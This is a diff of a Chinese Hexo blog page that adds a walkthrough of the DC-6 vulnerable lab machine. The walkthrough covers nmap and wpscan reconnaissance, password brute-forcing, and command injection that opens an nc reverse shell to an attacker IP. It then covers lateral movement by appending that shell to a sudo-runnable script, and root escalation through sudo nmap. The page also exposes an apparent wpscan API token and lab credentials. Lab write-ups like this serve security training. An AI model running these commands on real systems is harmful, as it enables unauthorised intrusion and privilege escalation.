@@ -8,18 +8,25 @@
   <link rel="dns-prefetch" href="http://example.com">
   <title>DC-6靶机攻略 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="情报收集 反弹shell 权限提升 总结  情报收集反弹shell权限提升总结">
+  <meta name="description" content="情报收集 反弹shell 权限提升 横向渗透 提权   总结  情报收集获取主机服务 12nmap -sP 192.168.193.0&#x2F;24nmap -A -T4 -p- 192.168.193.139 可以看到开放ssh服务与http服务。打开网站没有看到登录界面，目录搜索试试。 12345# 登录界面查找dirsearch -u http:&#x2F;&#x2F;wordy&#x2F; #网站类型查找。whatweb h">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DC-6靶机攻略">
 <meta property="og:url" content="http://example.com/2024/07/22/DC-6%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="情报收集 反弹shell 权限提升 总结  情报收集反弹shell权限提升总结">
+<meta property="og:description" content="情报收集 反弹shell 权限提升 横向渗透 提权   总结  情报收集获取主机服务 12nmap -sP 192.168.193.0&#x2F;24nmap -A -T4 -p- 192.168.193.139 可以看到开放ssh服务与http服务。打开网站没有看到登录界面，目录搜索试试。 12345# 登录界面查找dirsearch -u http:&#x2F;&#x2F;wordy&#x2F; #网站类型查找。whatweb h">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/DC-6/image.png">
+<meta property="og:image" content="http://example.com/img/DC-6/image-1.png">
+<meta property="og:image" content="http://example.com/img/DC-6/image-2.png">
+<meta property="og:image" content="http://example.com/img/DC-6/image-3.png">
+<meta property="og:image" content="http://example.com/img/DC-6/image-4.png">
+<meta property="og:image" content="http://example.com/img/DC-6/image-5.png">
 <meta property="article:published_time" content="2024-07-22T01:07:02.000Z">
-<meta property="article:modified_time" content="2024-07-22T03:39:23.849Z">
+<meta property="article:modified_time" content="2024-07-24T02:52:47.950Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="DC系列靶机攻略">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/DC-6/image.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -61,6 +68,8 @@
 				<li><a href="/">主页</a></li>
 	        
 				<li><a href="/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/">随笔</a></li>
+	        
+				<li><a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">靶机攻略</a></li>
 	        
 			</ul>
 		</nav>
@@ -118,6 +127,8 @@
 			
 				
 			
+				
+			
 			
 			
 			<nav class="header-nav">
@@ -135,12 +146,14 @@
 			</nav>
 
 			<nav class="header-menu js-header-menu">
-				<ul style="width: 50%">
+				<ul style="width: 70%">
 				
 				
-					<li style="width: 50%"><a href="/">主页</a></li>
+					<li style="width: 33.333333333333336%"><a href="/">主页</a></li>
 		        
-					<li style="width: 50%"><a href="/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/">随笔</a></li>
+					<li style="width: 33.333333333333336%"><a href="/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/">随笔</a></li>
+		        
+					<li style="width: 33.333333333333336%"><a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">靶机攻略</a></li>
 		        
 				</ul>
 			</nav>
@@ -178,10 +191,39 @@
         <ul>
 <li><a href="#%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86">情报收集</a></li>
 <li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li>
-<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
+<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a><ul>
+<li><a href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F">横向渗透</a></li>
+<li><a href="#%E6%8F%90%E6%9D%83">提权</a></li>
+</ul>
+</li>
 <li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
 </ul>
-<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
+<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><p>获取主机服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.193.0/24</span><br><span class="line">nmap -A -T4 -p- 192.168.193.139</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-6/image.png" alt="alt text"><br>可以看到开放ssh服务与http服务。<br>打开网站没有看到登录界面，目录搜索试试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 登录界面查找</span><br><span class="line">dirsearch -u http://wordy/ </span><br><span class="line"></span><br><span class="line">#网站类型查找。</span><br><span class="line">whatweb http://wordy/</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-6/image-1.png" alt="alt text"><br>找到登录界面，发现网站类型为wordpress。情报收集告一段落。</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>先获取网站帐号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 获取帐号</span><br><span class="line">wpscan --url http://wordy --api-token QK4yHoAgn8S2v9r1jdeDYUO2c8XUFvwanM4AVco9nbk -e u</span><br><span class="line"></span><br><span class="line"># 获取密码本，获取kali自带密码本，过滤k01关键字</span><br><span class="line">zcat /usr/share/wordlists/rockyou.txt.gz | grep k01 &gt; ./DC-6-P.txt</span><br><span class="line"></span><br><span class="line"># 获取密码。</span><br><span class="line">wpscan --url http://wordy --api-token QK4yHoAgn8S2v9r1jdeDYUO2c8XUFvwanM4AVco9nbk -U DC-6-U.txt -P DC-6-P.txt</span><br><span class="line"></span><br><span class="line"># 成功找到一个用户密码</span><br><span class="line">mark helpdesk01</span><br></pre></td></tr></table></figure>
+<p>登录看看，发现存在可以执行命令的界面，执行命令试试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.1 | ls</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-6/image-2.png" alt="alt text"><br>由此可知存在命令行注入漏洞，尝试反弹shell，由于限制了输入大小，可以使用brup或者在网页修改大小限制。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 修改post参数</span><br><span class="line">10.0.0.1 | nc -e /bin/bash 192.168.193.128 10086</span><br></pre></td></tr></table></figure>
+<p>至此建立反弹shell</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><p>在mark的每日任务清单里发现新的用户名和密码。<br><img src="/img/DC-6/image-3.png" alt="alt text"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">graham GSo7isUM1D4</span><br></pre></td></tr></table></figure>
+<p>使用ssh登录新用户查看权限<br>发现可以执行&#x2F;home&#x2F;jens&#x2F;backups.sh脚本，查看脚本权限。<br>发现脚本属于jens，同组用户拥有写权限，而用id命令发现为同组用户，根据这些情报就可以切换用户为jens。<br><img src="/img/DC-6/image-4.png" alt="alt text"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash 192.168.193.128 10086&quot; &gt;&gt; backups.sh </span><br><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看jens发现可以执行&#x2F;usr&#x2F;bin&#x2F;nmap，而该指令有漏洞，可以提权。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch root_shell.sh</span><br><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; root_shell.sh</span><br><span class="line">sudo nmap --script=root_shell.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-6/image-5.png" alt="alt text"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>存在命令行输入漏洞，可以获取反弹shell。</li>
+<li>每日清单里存在帐号密码，可以进行横向渗透。</li>
+<li>存在脚本，同组用户可以写与执行，且可以sudo无密码执行，可以进行横向渗透。</li>
+<li>nmap可以sudo无密码执行，且该脚本存在权限提升漏洞。</li>
+</ol>
+
       
 
       
